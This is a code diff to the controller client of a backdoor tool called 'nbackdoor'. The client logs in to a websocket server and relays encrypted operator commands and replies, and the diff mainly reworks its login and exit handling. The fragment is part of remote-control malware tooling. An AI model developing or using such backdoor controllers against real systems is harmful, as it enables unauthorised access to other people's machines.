@@ -26,24 +26,35 @@ class ControllerClient:
         self.exit = False
 
     def run(self):
-        while True:
+        while not client.exit:
             try:
+                os.system('cls')
                 print 'finding server...'
                 self.ws = create_connection("ws://localhost:8888/")
-                print 'server connected.'
+                os.system('cls')
 
                 pwd = raw_input('please input the password:')
                 sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET), 'pwd': self.encrypt(pwd)}
                 self.ws.send(json.dumps(sercret_msg))
 
-                while True:
-                    input_str = raw_input('nbackdoor:')
-                    self.ws.send(self.command_to_msg(input_str))
+                msg = json.loads(self.ws.recv())
+                if 'data' not in msg:
+                    continue
+                data = self.decrypt(msg['data'])
+                os.system('cls')
+                print data
+                if data == 'login failed':
+                    self.exit = True
 
-                    msg = json.loads(self.ws.recv())
-                    if 'data' in msg:
-                        data = self.decrypt(msg['data'])
-                        print data
+                while not self.exit:
+                    input_str = raw_input('nbackdoor:')
+                    msg = self.command_to_msg(input_str)
+                    if msg:
+                        self.ws.send(msg)
+                        msg = json.loads(self.ws.recv())
+                        if 'data' in msg:
+                            data = self.decrypt(msg['data'])
+                            print data
 
                 self.ws.close()
 
@@ -75,7 +86,7 @@ class ControllerClient:
             pass
         elif command_str == 'exit':
             self.exit = True
-            exit()
+            return None
 
         return json.dumps({'data': self.encrypt('data')})
 
